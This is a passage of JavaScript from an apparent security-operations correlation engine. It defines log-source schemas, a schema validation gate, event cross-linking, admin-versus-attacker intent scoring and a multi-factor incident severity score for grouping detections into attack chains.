          : (det.confidence_score || det.riskScore || 30);

        return {
          // ── Stage identity ──────────────────────────────────────
          stageIndex    : si,
          phase,
          phaseOrder    : phaseIdx,
          phaseTactic   : tactic,
          // ── Detection info ──────────────────────────────────────
          detectionId   : det.id,
          ruleId        : det.ruleId,
          ruleName      : det.ruleName || det.detection_name || det.title,
          severity      : det.aggregated_severity || det.severity,
          riskScore     : det.riskScore || 0,
          // ── Timestamps (real, non-zero) ─────────────────────────
          timestamp     : ts,
          first_seen    : ts,
          last_seen     : det.last_seen || ts,
          duration_ms   : Math.max(0, lastMs - tsMs),
          // ── MITRE ──────────────────────────────────────────────
          technique     : det.mitre?.technique || det.technique || '',
          techniqueName : det.mitre?.name || '',
          tactic,
          tactics       : det.mitre
            ? [{ tactic: det.mitre.tactic, technique: det.mitre.technique,
                 name: det.mitre.name, confidence: stageConf, role: 'primary' }]
            : [],
          // ── Context ────────────────────────────────────────────
          narrative     : det.narrative || '',
          user          : det.user || '',
          host          : curHost,
          commandLine   : det.commandLine || '',
          process       : det.process || '',
          srcIp         : det.srcIp || '',
          // ── Causal graph info ───────────────────────────────────
          causalEdges   : outEdges,
          isHostTransition,
          causalIndex   : si,
          hasCausalViolation,  // true = this stage has a tactic-ordering issue
          // ── Evidence & confidence ───────────────────────────────
          enrichedEvents  : enrichedEv,
          rawEvidenceLogs,
          isParent        : det._isParent || false,
          confidence      : stageConf,
          linkedEventCount: (det.linkedEvents || []).length,
          // ── BCE v10: Inferred stage markers ────────────────────
          inferred          : !!(det.inferred),
          inferredFrom      : det.inferredFrom || null,
          inferredConfidence: det.inferredConfidence || null,
        };
      });
    }

    // ════════════════════════════════════════════════════════════════
    //  LOG SCHEMA REGISTRY  (Schema-First Validation Gate)
    //  Each log-source category declares:
    //    eventIdRanges   — accepted numeric EventID ranges (inclusive)  [optional]
    //    requiredFields  — fields that MUST be present (one of each sub-array)
    //    forbiddenFields — fields that must be ABSENT for this category
    //    keywords        — message/source keywords that confirm membership
    //    os              — expected OS for this log category
    //
    //  A rule may carry `logCategory` pointing to a key here.
    //  _validateEventSchema() returns true only when the event
    //  satisfies the declared constraints for that category —
    //  preventing cross-category rule evaluation.
    // ════════════════════════════════════════════════════════════════
    const LOG_SCHEMA = {

      // ── Windows Security Event Log ──────────────────────────────
      // FIX v7: Added 4688 (process creation) and 1102 (audit log cleared)
      // to windows_security ranges; removed overly-strict range gating for
      // rules that fire on 4688 (common process creation event).
      windows_security: {
        os: 'windows',
        eventIdRanges: [[1100,1110],[4608,4799],[4900,4999],[5136,5145],[5152,5158],[5888,5889]],
        requiredFields: [['EventID']],
        forbiddenFields: [],
        keywords: ['security','winlogbeat','winsec'],
        description: 'Windows Security Event Log (EVTX channel: Security)',
      },

      // ── Windows Process Creation (EventID 4688) ──────────────────
      // NEW v7: Dedicated schema for process-creation rules (CSDE-WIN-013,
      // CSDE-WIN-014, CSDE-WIN-016, CSDE-WIN-017). Prevents rules that need
      // 4688 from being blocked by the narrow windows_security range.
      windows_process_creation: {
        os: 'windows',
        eventIdRanges: [[4688,4688],[4656,4663],[4670,4670]],
        requiredFields: [['EventID']],
        forbiddenFields: [],
        keywords: ['process','4688','process creation','new process'],
        description: 'Windows process creation events (Security: EventID 4688)',
      },

      // ── Windows Log-Tampering Events ─────────────────────────────
      // NEW v7: For log-clearing, audit-policy, and service-stop rules.
      windows_tamper: {
        os: 'windows',
        eventIdRanges: [[1100,1110],[4616,4616],[4719,4719],[4906,4908],[6005,6009],[7034,7036],[7040,7040],[7045,7045]],
        requiredFields: [['EventID']],
        forbiddenFields: [],
        keywords: ['1102','4719','log cleared','audit policy','tamper'],
        description: 'Windows log-clearing and audit-policy tampering events',
      },

      // ── Windows Account-Management Events ───────────────────────
      // NEW v7: Covers account creation / group membership events natively.
      windows_account: {
        os: 'windows',
        eventIdRanges: [[4720,4730],[4732,4760],[4762,4767],[4780,4799]],
        requiredFields: [['EventID']],
        forbiddenFields: [],
        keywords: ['account','group','member','4720','4728','4732'],
        description: 'Windows account management events',
      },

      // ── Windows System / Service Event Log ──────────────────────
      windows_system: {
        os: 'windows',
        eventIdRanges: [[7000,7099],[4697,4697],[6005,6009]],
        requiredFields: [['EventID']],
        forbiddenFields: [],
        keywords: ['system','scm','service control'],
        description: 'Windows System Event Log (EVTX channel: System)',
      },

      // ── Windows PowerShell / ScriptBlock Log ────────────────────
      windows_powershell: {
        os: 'windows',
        eventIdRanges: [[400,403],[600,600],[4100,4106]],
        requiredFields: [['EventID']],
        forbiddenFields: [],
        keywords: ['powershell','microsoft-windows-powershell'],
        description: 'Windows PowerShell / Script-Block log',
      },

      // ── Sysmon (Microsoft Sysinternals) ─────────────────────────
      // FIX v7: Require at least one Sysmon-specific field to confirm
      // this is really Sysmon and not a Linux event with low EIDs.
      sysmon: {
        os: 'windows',
        eventIdRanges: [[1,30]],
        requiredFields: [['EventID'],['Image','ParentImage','TargetFilename','DestinationIp','SourceIp','PipeName','source','Channel']],
        forbiddenFields: [],
        keywords: ['sysmon','microsoft-windows-sysmon'],
        description: 'Microsoft Sysmon operational log (channel: Microsoft-Windows-Sysmon/Operational)',
      },

      // ── Windows Authentication Events ───────────────────────────
      windows_auth: {
        os: 'windows',
        eventIdRanges: [[4624,4625],[4634,4648],[4768,4776]],
        requiredFields: [['EventID']],
        forbiddenFields: [],
        keywords: ['logon','authentication','kerberos','ntlm'],
        description: 'Windows logon/authentication events',
      },

      // ── Linux syslog / auth.log ─────────────────────────────────
      linux_syslog: {
        os: 'linux',
        eventIdRanges: [],          // Linux logs have no numeric EventID
        requiredFields: [['message','msg','raw']],
        forbiddenFields: ['EventID'],
        keywords: ['syslog','auth.log','secure','kern.log','pam_unix','sshd'],
        description: 'Linux syslog / auth.log (rsyslog / syslog-ng)',
      },

      // ── Linux auditd ─────────────────────────────────────────────
      linux_auditd: {
        os: 'linux',
        eventIdRanges: [],
        requiredFields: [['message','msg','raw']],
        forbiddenFields: ['EventID'],
        keywords: ['auditd','audit.log','type=syscall','type=execve','auid='],
        description: 'Linux auditd kernel audit records',
      },

      // ── Firewall / Network Flow ──────────────────────────────────
      firewall: {
        os: 'any',
        eventIdRanges: [[5152,5159]],  // Windows Filtering Platform
        requiredFields: [['destIp','DestinationIp','DestinationAddress','dest_ip']],
        forbiddenFields: [],
        keywords: ['firewall','paloalto','fortinet','checkpoint','wfp','filter'],
        description: 'Firewall allow/deny records and Windows Filtering Platform',
      },

      // ── Web Access / Proxy Log ───────────────────────────────────
      web: {
        os: 'any',
        eventIdRanges: [],
        requiredFields: [['url','uri','request','http_method']],
        forbiddenFields: [],
        keywords: ['apache','nginx','iis','squid','bluecoat','access_log','http'],
        description: 'Web server / proxy access log',
      },

      // ── Database Audit Log ───────────────────────────────────────
      database: {
        os: 'any',
        eventIdRanges: [],
        requiredFields: [['query','sql','statement','db_name']],
        forbiddenFields: [],
        keywords: ['mssql','mysql','oracle','postgresql','dbaudit','sql server'],
        description: 'Database audit / query log',
      },
    };

    // ── Schema Validation Gate ────────────────────────────────────
    // Returns true  → event passes the schema for this rule's logCategory
    // Returns false → event does NOT match expected log category; skip rule
    // If the rule has no logCategory, always returns true (backward compat)
    // FIX v7: Softened EventID range gate — if the event OS matches AND has
    // EventID, but EID falls outside declared ranges, only skip if the
    // schema's requiredFields demand a specific EventID match (auth/sysmon).
    // This prevents process-creation events (4688) from being blocked by
    // overly narrow ranges when the rule fires on 4688 directly.
    function _validateEventSchema(rule, event) {
      const cat = rule.logCategory;
      if (!cat) return true;                      // no schema constraint → pass
      const schema = LOG_SCHEMA[cat];
      if (!schema) return true;                   // unknown category → pass

      // ── OS gate ────────────────────────────────────────────────
      if (schema.os !== 'any') {
        const evOs = event._os || _detectOS(event);
        if (evOs !== 'unknown' && evOs !== schema.os) return false;
      }

      // ── EventID range gate ──────────────────────────────────────
      // Only enforce if schema declares ranges AND the event has an EventID
      if (schema.eventIdRanges && schema.eventIdRanges.length > 0) {
        const eid = parseInt(event.EventID, 10);
        if (!isNaN(eid)) {
          const inRange = schema.eventIdRanges.some(([lo, hi]) => eid >= lo && eid <= hi);
          if (!inRange) {
            // Hard-fail ONLY for schemas that exclusively care about specific EID ranges
            // (auth, sysmon, tamper, powershell). For general windows_security / windows_process_creation,
            // the OS gate is sufficient — the rule's own match() predicate checks EID.
            const hardSchemas = ['windows_auth','sysmon','windows_powershell','windows_tamper',
                                 'linux_syslog','linux_auditd','firewall','web','database'];
            if (hardSchemas.includes(cat)) return false;
            // For windows_security, windows_process_creation, windows_system, windows_account:
            // trust the rule's own match() to check EID — don't block here.
          }
        } else if (schema.requiredFields && schema.requiredFields.some(g => g.includes('EventID'))) {
          // No EventID at all for a schema that requires one
          return false;
        }
      }

      // ── Required-field gate ─────────────────────────────────────
      // Each sub-array is an OR group: at least ONE field in the group must exist
      if (schema.requiredFields) {
        for (const group of schema.requiredFields) {
          const satisfied = group.some(f => {
            const v = event[f];
            return v !== undefined && v !== null && v !== '';
          });
          if (!satisfied) return false;
        }
      }

      // ── Forbidden-field gate ────────────────────────────────────
      if (schema.forbiddenFields) {
        for (const f of schema.forbiddenFields) {
          if (event[f] !== undefined && event[f] !== null && event[f] !== '') return false;
        }
      }

      return true;   // all gates passed
    }

    // ════════════════════════════════════════════════════════════════
    //  CROSS-LOG LINKER
    //  Links related events ACROSS log sources using:
    //    • Process ID (PID) matching within same host
    //    • Timestamp proximity (within CROSS_LINK_WINDOW_MS)
    //    • Host + User identity alignment
    //
    //  Returns a Map<eventIndex, Set<eventIndex>> of linked event pairs.
    //  Also decorates each event with a _linkedEventIds array.
    //  Example: EventID 4688 (process creation) + EventID 5156 (WFP network
    //  event) with matching PID on same host → linked as same process activity.
    // ════════════════════════════════════════════════════════════════
    const CROSS_LINK_WINDOW_MS = 10_000; // 10-second proximity window

    // Log-source category classifier for an event
    function _classifyEventSource(event) {
      const eid = parseInt(event.EventID, 10);
      const src = (event.source || event.log_source || event.logsource || event.Channel || '').toLowerCase();
      const msg = (event.message || event.msg || event.raw || '').toLowerCase();

      // Sysmon (low EventIDs 1-30, or explicit channel)
      if (src.includes('sysmon') || (!isNaN(eid) && eid >= 1 && eid <= 30 &&
          (event.Image || event.TargetFilename || event.DestinationIp || event.SourceIp))) {
        return 'sysmon';
      }
      // PowerShell
      if (!isNaN(eid) && eid >= 4100 && eid <= 4106) return 'windows_powershell';
      // Windows Security
      if (!isNaN(eid) && eid >= 4608 && eid <= 5158) return 'windows_security';
      // Windows System/Service
      if (!isNaN(eid) && (eid === 7045 || eid === 4697 || (eid >= 7000 && eid <= 7099))) return 'windows_system';
      // Firewall (WFP)
      if (!isNaN(eid) && eid >= 5152 && eid <= 5159) return 'firewall';
      // Linux syslog
      if (src.includes('syslog') || src.includes('auth') || msg.includes('pam_unix') || msg.includes('sshd')) return 'linux_syslog';
      // Linux auditd
      if (src.includes('auditd') || msg.includes('type=syscall') || msg.includes('auid=')) return 'linux_auditd';
      // Web
      if (event.url || event.uri || event.http_method || src.includes('apache') || src.includes('nginx')) return 'web';
      // Database
      if (event.query || event.sql || event.db_name || src.includes('mssql') || src.includes('mysql')) return 'database';
      return 'unknown';
    }

    // ════════════════════════════════════════════════════════════════
    //  ACE v6 — ADVERSARY IDENTITY RESOLVER
    //  Extracts normalized adversary identity keys from raw events.
    //  Keys: normalized user, source IP, logon session ID, Kerberos
    //  ticket/auth context, parent-child process lineage, host.
    //  Returns a canonical adversary fingerprint for cross-host correlation.
    // ════════════════════════════════════════════════════════════════
    function _resolveAdversaryIdentity(event) {
      const user       = (event.user || event.SubjectUserName || event.TargetUserName || '').toLowerCase().trim();
      const srcIp      = (event.srcIp || event.IpAddress || event.ClientAddress || '').replace('::ffff:','').trim();
      const host       = (event.computer || event.Computer || '').toLowerCase().trim();
      const pid        = (event.ProcessId || event.pid || event.NewProcessId || '').toString().trim();
      const ppid       = (event.ParentProcessId || event.ppid || '').toString().trim();
      const sessionId  = (event.LogonId || event.SubjectLogonId || event.TargetLogonId || '').toString().trim();
      const authPkg    = (event.AuthenticationPackageName || event.PackageName || '').toLowerCase();
      const process    = (event.process || event.Image || event.NewProcessName || '').toLowerCase().split('\\').pop().split('/').pop();
      const parentProc = (event.parentProcess || event.ParentImage || '').toLowerCase().split('\\').pop().split('/').pop();

      // Normalize user: strip domain prefix for cross-domain correlation
      const userNorm = user.includes('\\') ? user.split('\\').pop() : user;

      // Determine if this is a system/service context (lower adversary weight)
      const isSystem = user === 'system' || user.includes('nt authority') ||
                       user.endsWith('$') || user === '' || user === '-';

      // Build composite adversary fingerprint
      // Priority: (srcIp + user) > (user + sessionId) > (user + host) > (host + process)
      const fingerprints = [];

      if (srcIp && srcIp !== '-' && srcIp !== '127.0.0.1' && srcIp !== '::1' && userNorm && !isSystem) {
        fingerprints.push({ type: 'srcip-user',   key: `${srcIp}::${userNorm}`,     confidence: 95 });
      }
      if (userNorm && sessionId && sessionId !== '0' && !isSystem) {
        fingerprints.push({ type: 'user-session', key: `${host}::${userNorm}::${sessionId}`, confidence: 90 });
      }
      if (userNorm && !isSystem) {
        fingerprints.push({ type: 'user-host',    key: `${host}::${userNorm}`,       confidence: 80 });
      }
      if (pid && ppid && pid !== '0' && ppid !== '0') {
        fingerprints.push({ type: 'process-lineage', key: `${host}::pid:${pid}::ppid:${ppid}`, confidence: 75 });
      }
      if (host && process && process !== 'system') {
        fingerprints.push({ type: 'host-process', key: `${host}::proc:${process}`,   confidence: 60 });
      }
      // Fallback: host only (system-level events)
      if (isSystem && host) {
        fingerprints.push({ type: 'host-system',  key: `${host}::*`,                 confidence: 50 });
      }

      return {
        user: userNorm,
        srcIp,
        host,
        pid,
        ppid,
        sessionId,
        authPkg,
        process,
        parentProcess: parentProc,
        isSystem,
        fingerprints,
        // Primary key for grouping (highest confidence available)
        primaryKey: fingerprints.length ? fingerprints[0].key : `${host}::unknown`,
        primaryType: fingerprints.length ? fingerprints[0].type : 'unknown',
      };
    }

    // ════════════════════════════════════════════════════════════════
    //  ACE v6 — INTENT CLASSIFIER
    //  Differentiates admin/legitimate activity from attacker behavior
    //  using process context, command patterns, account type, timing.
    //  Returns: { intent: 'admin'|'attacker'|'ambiguous', signals, confidence }
    // ════════════════════════════════════════════════════════════════
    function _classifyIntent(event, detection) {
      const proc    = (event.process || event.Image || event.commandLine || '').toLowerCase();
      const cmd     = (event.commandLine || '').toLowerCase();
      const user    = (event.user || '').toLowerCase();
      const ts      = event.timestamp ? new Date(event.timestamp) : null;

      let adminScore    = 0;
      let attackerScore = 0;
      const adminSignals    = [];
      const attackerSignals = [];

      // ── Admin signals ──────────────────────────────────────────
      for (const p of ADMIN_INTENT_SIGNALS.processes) {
        if (proc.includes(p) || cmd.includes(p)) {
          adminScore += 25;
          adminSignals.push(`Known admin process: ${p}`);
          break;
        }
      }
      for (const c of ADMIN_INTENT_SIGNALS.commands) {
        if (cmd.includes(c)) {
          adminScore += 20;
          adminSignals.push(`Admin command context: ${c}`);
          break;
        }
      }
      for (const a of ADMIN_INTENT_SIGNALS.accounts) {
        if (user.includes(a)) {
          adminScore += 15;
          adminSignals.push(`Service/admin account pattern: ${a}`);
          break;
        }
      }
      // Maintenance window (weekend or early hours)
      if (ts && !isNaN(ts.getTime())) {
        const h   = ts.getUTCHours();
        const dow = ts.getUTCDay();
        if (ADMIN_INTENT_SIGNALS.timePatterns.maintenanceHours.includes(h)) {
          adminScore += 10;
          adminSignals.push(`Maintenance window timing (${h}:00 UTC)`);
        }
        if (ADMIN_INTENT_SIGNALS.timePatterns.maintenanceDays.includes(dow)) {
          adminScore += 8;
          adminSignals.push(`Weekend activity (day ${dow})`);
        }
      }

      // ── Attacker signals ───────────────────────────────────────
      for (const p of ATTACKER_INTENT_SIGNALS.processes) {
        if (proc.includes(p) || cmd.includes(p)) {
          attackerScore += 35;
          attackerSignals.push(`Known attacker tool: ${p}`);
          break;
        }
      }
      for (const pattern of ATTACKER_INTENT_SIGNALS.commandPatterns) {
        if (pattern.test(cmd)) {
          attackerScore += 30;
          attackerSignals.push(`Attacker command pattern: ${pattern.source.slice(0,40)}`);
          break;
        }
      }
      // High-risk detection from rule engine
      if (detection && detection.riskScore >= 85) {
        attackerScore += 20;
        attackerSignals.push(`High-risk detection: ${detection.ruleName || detection.ruleId} (score ${detection.riskScore})`);
      }
      const port = parseInt(event.destPort || event.DestinationPort || '0', 10);
      if (ATTACKER_INTENT_SIGNALS.networkIndicators.suspiciousPorts.includes(port)) {
        attackerScore += 25;
        attackerSignals.push(`Suspicious outbound port: ${port}`);
      }

      // ── Classify ───────────────────────────────────────────────
      let intent = 'ambiguous';
      let confidence = 50;
      if (attackerScore > adminScore + 15) {
        intent = 'attacker';
        confidence = Math.min(95, 50 + attackerScore - adminScore);
      } else if (adminScore > attackerScore + 20) {
        intent = 'admin';
        confidence = Math.min(95, 50 + adminScore - attackerScore);
      }

      return { intent, confidence, adminScore, attackerScore, adminSignals, attackerSignals };
    }

    // ════════════════════════════════════════════════════════════════
    //  ACE v6 — CROSS-HOST EVENT LINKER (enhanced)
    //  Decorates events with adversary identity + builds adjacency for:
    //    1. Same PID on same host (cross-log source correlation)
    //    2. Same user + source IP across different hosts (lateral movement)
    //    3. Same logon session ID (Kerberos/NTLM session tracking)
    //    4. Parent-child process lineage (process tree traversal)
    //    5. Time-proximity with shared adversary identity
    // ════════════════════════════════════════════════════════════════
    function _crossLinkEvents(events) {
      // ── Build adversary identity for each event ────────────────
      const pidIndex      = new Map(); // host::pid  → [idx]
      const identityIndex = new Map(); // primary adversary key → [idx]
      const sessionIndex  = new Map(); // host::sessionId → [idx]
      const srcIpIndex    = new Map(); // srcIp → [idx]

      events.forEach((ev, idx) => {
        ev._logSource = ev._logSource || _classifyEventSource(ev);
        const identity = _resolveAdversaryIdentity(ev);
        ev._identity   = identity;
        ev._hostKey    = identity.host;
        ev._pid        = identity.pid;
        ev._tsMs       = new Date(ev.timestamp || 0).getTime();

        // Index by PID + host
        if (identity.pid && identity.pid !== '0' && identity.host) {
          const key = `${identity.host}::${identity.pid}`;
          if (!pidIndex.has(key)) pidIndex.set(key, []);
          pidIndex.get(key).push(idx);
        }

        // Index by each adversary fingerprint
        for (const fp of identity.fingerprints) {
          if (!identityIndex.has(fp.key)) identityIndex.set(fp.key, []);
          identityIndex.get(fp.key).push(idx);
        }

        // Index by session ID (cross-event session tracking)
        if (identity.sessionId && identity.sessionId !== '0' && identity.host) {
          const skey = `${identity.host}::${identity.sessionId}`;
          if (!sessionIndex.has(skey)) sessionIndex.set(skey, []);
          sessionIndex.get(skey).push(idx);
        }

        // Index by source IP (cross-host attacker tracking)
        if (identity.srcIp && identity.srcIp !== '-' && identity.srcIp !== '127.0.0.1') {
          if (!srcIpIndex.has(identity.srcIp)) srcIpIndex.set(identity.srcIp, []);
          srcIpIndex.get(identity.srcIp).push(idx);
        }
      });

      // Build adjacency map
      const links = new Map(); // idx → Set<{idx, edgeType, confidence}>
      const ensureLink = (a, b, edgeType, edgeConf) => {
        if (a === b) return;
        if (!links.has(a)) links.set(a, new Map());
        if (!links.has(b)) links.set(b, new Map());
        // Only upgrade edge (never downgrade existing higher-confidence link)
        const existing = links.get(a).get(b);
        if (!existing || existing.confidence < edgeConf) {
          links.get(a).set(b, { idx: b, edgeType, confidence: edgeConf });
          links.get(b).set(a, { idx: a, edgeType, confidence: edgeConf });
        }
      };

      // ── Link 1: Same PID on same host, different log sources ────
      pidIndex.forEach((idxList) => {
        if (idxList.length < 2) return;
        for (let i = 0; i < idxList.length; i++) {
          for (let j = i + 1; j < idxList.length; j++) {
            const a = events[idxList[i]], b = events[idxList[j]];
            if (a._logSource !== b._logSource) {
              ensureLink(idxList[i], idxList[j], 'pid-crosslog', 90);
            }
          }
        }
      });

      // ── Link 2: Shared adversary identity fingerprint ──────────
      identityIndex.forEach((idxList, key) => {
        if (idxList.length < 2) return;
        const sorted = idxList.slice().sort((a, b) => events[a]._tsMs - events[b]._tsMs);
        for (let i = 0; i < sorted.length - 1; i++) {
          const a = events[sorted[i]], b = events[sorted[i+1]];
          const gap = Math.abs(b._tsMs - a._tsMs);
          if (gap <= CFG.ACE_PROXIMITY_WINDOW_MS) {
            // Determine edge type from key structure
            const edgeType = a._identity.host !== b._identity.host
              ? 'cross-host-identity' : 'same-host-identity';
            const fpConfidence = Math.max(
              ...([...a._identity.fingerprints].map(f => f.key === key ? f.confidence : 0)),
              60
            );
            ensureLink(sorted[i], sorted[i+1], edgeType, fpConfidence);
          }
        }
      });

      // ── Link 3: Same logon session ID ──────────────────────────
      sessionIndex.forEach((idxList) => {
        if (idxList.length < 2) return;
        const sorted = idxList.slice().sort((a,b) => events[a]._tsMs - events[b]._tsMs);
        for (let i = 0; i < sorted.length - 1; i++) {
          ensureLink(sorted[i], sorted[i+1], 'session-continuity', 88);
        }
      });

      // ── Link 4: Source IP across hosts (attacker pivoting) ─────
      srcIpIndex.forEach((idxList) => {
        if (idxList.length < 2) return;
        const sorted = idxList.slice().sort((a,b) => events[a]._tsMs - events[b]._tsMs);
        for (let i = 0; i < sorted.length - 1; i++) {
          const a = events[sorted[i]], b = events[sorted[i+1]];
          const gap = Math.abs(b._tsMs - a._tsMs);
          if (gap <= CFG.ACE_PROXIMITY_WINDOW_MS && a._hostKey !== b._hostKey) {
            ensureLink(sorted[i], sorted[i+1], 'srcip-pivot', 85);
          }
        }
      });

      // ── Decorate events ────────────────────────────────────────
      links.forEach((linkedMap, idx) => {
        events[idx]._linkedEventIds = Array.from(linkedMap.keys());
        events[idx]._linkedEdges    = Array.from(linkedMap.values());
      });

      return links;
    }

    // ════════════════════════════════════════════════════════════════
    //  SOC v5 — FORENSIC TEMPORAL-IDENTITY CORRELATION ENGINE
    //  Groups deduplicated alerts that:
    //    • Share the same Device/HostID  AND
    //    • Share the same User/AccountID (or SYSTEM-level)  AND
    //    • Occur within CORR_WINDOW_MS of each other (sliding window)
    //  Into a forensically-accurate Incident with:
    //    • parent alert  — highest-severity/riskScore detection
    //    • child alerts  — all other detections (full MITRE preserved)
    //    • behavior-aware multi-technique title
    //    • real First Seen / Last Seen / Duration (not 0ms)
    //    • confidence score with explainable reasons
    //    • full attack phase timeline
    //    • FP suppression applied before forming incidents
    //    • forensic narrative with confidence-calibrated language
    // ════════════════════════════════════════════════════════════════
    // Kept for backward-compat (ACE uses CFG.ACE_PROXIMITY_WINDOW_MS now)
    const CORR_WINDOW_MS = 60_000;

    // ════════════════════════════════════════════════════════════════
    //  ACE v6 — MULTI-FACTOR DYNAMIC SCORING ENGINE
    //  Factors: technique severity (MITRE weight), stage count,
    //  cross-host movement, privilege level, behavior rarity,
    //  sequence validity, known malicious combos, intent signals.
    //  Severity bands: 0–40 Low, 41–70 Medium, 71–89 High, 90–100 Critical
    // ════════════════════════════════════════════════════════════════
    function _computeACEScore(cluster, dag, crossHost, intentSignals, parent) {
      let score   = 20; // baseline
      const reasons = [];

      // 1. Technique severity (MITRE weight — highest in chain)
      let maxTechWeight = 0;
      cluster.forEach(d => {
        const tech = d.mitre?.technique || d.technique || '';
        const w    = TECHNIQUE_SEV_WEIGHT[tech] || TECHNIQUE_SEV_WEIGHT[tech.split('.')[0]] || 0;
        if (w > maxTechWeight) maxTechWeight = w;
      });
      if (maxTechWeight > 0) {
        score += maxTechWeight;
        const topTech = cluster.find(d => {
          const t = d.mitre?.technique || d.technique || '';
          return (TECHNIQUE_SEV_WEIGHT[t] || 0) === maxTechWeight;
        });
        reasons.push(`Technique severity: ${topTech?.mitre?.technique || ''} (+${maxTechWeight})`);
      }

      // 2. Number of distinct attack phases (stage count)
      const stageCount = dag.phaseSequence.length;
      if (stageCount >= 5) {
        score += 18;
        reasons.push(`Full kill chain — ${stageCount} phases (+18)`);
      } else if (stageCount === 4) {
        score += 14;
        reasons.push(`${stageCount}-phase attack chain (+14)`);
      } else if (stageCount === 3) {
        score += 10;
        reasons.push(`${stageCount}-phase attack chain (+10)`);
      } else if (stageCount === 2) {
        score += 6;
        reasons.push(`2-phase correlated chain (+6)`);
      }

      // 3. Cross-host movement (lateral movement confirmed)
      if (crossHost || dag.crossHost) {
        score += 15;
        reasons.push('Cross-host lateral movement confirmed (+15)');
      }

      // 4. Privilege level
      const user     = (parent.user || '').toLowerCase();
      const isSystem = user.includes('system') || user.includes('nt authority');
      const isAdmin  = user.includes('admin') || user.includes('administrator') || user.includes('root');
      if (isSystem) {
        score += 12;
        reasons.push('SYSTEM-privilege execution (+12)');
      } else if (isAdmin) {
        score += 8;
        reasons.push('Admin-level account (+8)');
      }

      // 5. Behavior rarity (from CONFIDENCE_FACTORS)
      const ruleIds = cluster.map(d => d.ruleId || '');
      let maxRarity = 0;
      ruleIds.forEach(rid => {
        const r = CONFIDENCE_FACTORS.behaviorRarity[rid] || 0;
        if (r > maxRarity) maxRarity = r;
      });
      if (maxRarity > 0) {
        score += Math.round(maxRarity * 0.6);
        reasons.push(`High-rarity behavior: +${Math.round(maxRarity * 0.6)}`);
      }

      // 6. Sequence validity bonus (DAG has valid causal edges)
      if (dag.edges.length >= 2) {
        score += 5;
        reasons.push(`Valid causal sequence (${dag.edges.length} edges) (+5)`);
      }
      // Invalid edge penalty (execution before authentication, etc.)
      if (dag.invalidEdges && dag.invalidEdges.length > 0) {
        score -= 5;
        reasons.push(`Causal order anomaly detected (${dag.invalidEdges.length} invalid edge${dag.invalidEdges.length>1?'s':''}) (-5)`);
      }

      // 7. Known malicious combos
      const techniques = cluster.map(d => d.mitre?.technique || d.technique || '').filter(Boolean);
      for (const combo of CONFIDENCE_FACTORS.knownMaliciousCombos) {
        if (combo.techniques.every(t => techniques.includes(t))) {
          score += Math.round(combo.bonus * 0.7);
          reasons.push(`Known attack combo: ${combo.label} (+${Math.round(combo.bonus * 0.7)})`);
        }
      }

      // 8. Attacker intent signals
      const attackerCount = intentSignals ? intentSignals.filter(s => s.intent === 'attacker').length : 0;
      const adminCount    = intentSignals ? intentSignals.filter(s => s.intent === 'admin').length    : 0;
      if (attackerCount > 0) {
        score += attackerCount * 4;
        reasons.push(`${attackerCount} attacker-intent signal${attackerCount>1?'s':''} (+${attackerCount*4})`);
      }
      if (adminCount > 0 && attackerCount === 0) {
        score -= adminCount * 5;
        reasons.push(`${adminCount} admin-intent signal${adminCount>1?'s':''} (-${adminCount*5})`);
      }

      // 9. Raw risk score from individual detections
      const maxRisk = Math.max(...cluster.map(d => d.riskScore || 0));
      if (maxRisk >= 90) {
        score += 8;
        reasons.push(`Highest detection risk: ${maxRisk}/100 (+8)`);
      } else if (maxRisk >= 70) {
        score += 4;
        reasons.push(`High detection risk: ${maxRisk}/100 (+4)`);
      }

      // 10. Cross-log corroboration
      const hasLinked = cluster.some(d => d.linkedEvents && d.linkedEvents.length > 0);
      if (hasLinked) {
        score += 5;
        reasons.push('Cross-log corroborated evidence (+5)');
      }

      score = Math.min(100, Math.max(0, Math.round(score)));

      // Determine severity band
      let severityBand;
      if      (score >= 90) severityBand = 'Critical';
      else if (score >= 71) severityBand = 'High';
      else if (score >= 41) severityBand = 'Medium';
      else                  severityBand = 'Low';

      return { score, severityBand, reasons };
    }

    // ════════════════════════════════════════════════════════════════
    //  ACE v6 — ADVERSARY-CENTRIC ATTACK-GRAPH CORRELATION ENGINE
    //
    //  DESIGN:
    //  Instead of grouping by host+user in a fixed 60-second window,
    //  this engine:
    //    1. Resolves adversary identity per detection (user/IP/session/
    //       process lineage) using _resolveAdversaryIdentity()
    //    2. Groups detections into "adversary buckets" using multi-key
    //       identity matching (any overlapping key → same adversary)
    //    3. Builds a DAG per adversary bucket with causal edges validated
    //       against VALID_CAUSAL_EDGES (rejects execution-before-auth etc.)
    //    4. Stitches cross-host detections sharing user+srcIP into one
    //       unified attack chain within ACE_PROXIMITY_WINDOW_MS
    //    5. Merges fragmented chains from the same adversary when gap
    //       ≤ ACE_MERGE_GAP_MS and phases continue (not restart)
    //    6. Applies FP suppression + intent classification
    //    7. Computes multi-factor dynamic confidence score
    //    8. Returns incidents with unified cross-host chain, phase timeline,
    //       full MITRE per node, attack-graph DAG metadata, causal ordering
    // ════════════════════════════════════════════════════════════════

    // ── Step 1: Build adversary identity key for a detection ──────
    function _detectionAdversaryKey(det) {
      const user   = (det.user || '').toLowerCase().trim();
      const srcIp  = (det.srcIp || '').replace('::ffff:','').trim();
      const host   = (det.computer || det.host || '').toLowerCase().trim();
      const sessId = (det.sessionId || det.LogonId || '').trim();

      const userNorm  = user.includes('\\') ? user.split('\\').pop() : user;
      const isSystem  = !userNorm || userNorm === 'system' || userNorm.includes('nt authority') || userNorm.endsWith('$');

      const keys = new Set();
      if (srcIp && srcIp !== '-' && !isSystem) keys.add(`ip:${srcIp}::u:${userNorm}`);
      if (userNorm && sessId && !isSystem)      keys.add(`h:${host}::u:${userNorm}::s:${sessId}`);
      if (userNorm && !isSystem)                keys.add(`h:${host}::u:${userNorm}`);
      if (userNorm && srcIp && !isSystem)       keys.add(`u:${userNorm}`); // cross-host same user
      if (isSystem)                             keys.add(`h:${host}::*`);
      // Fallback
      if (!keys.size) keys.add(`h:${host}::unknown`);
      return { keys, userNorm, srcIp, host, isSystem };
    }

    // ── Step 2: Union-Find for adversary bucket merging ───────────
    // FIX v7: Added strict correlation guards:
    //   1. Never merge detections from different users unless cross-host confirmed
    //      by shared source IP (prevents unrelated events grouping).
    //   2. System accounts (SYSTEM, NT AUTHORITY) use host-only correlation,
    //      not cross-user identity (prevents all-SYSTEM events becoming one incident).
    //   3. Time proximity enforced strictly per CFG.ACE_PROXIMITY_WINDOW_MS.
    function _buildAdversaryBuckets(dedupDets) {
      // ── PHASE 0: OS-compatibility gate ───────────────────────────
      // Detections with known incompatible OS must NOT be grouped into the
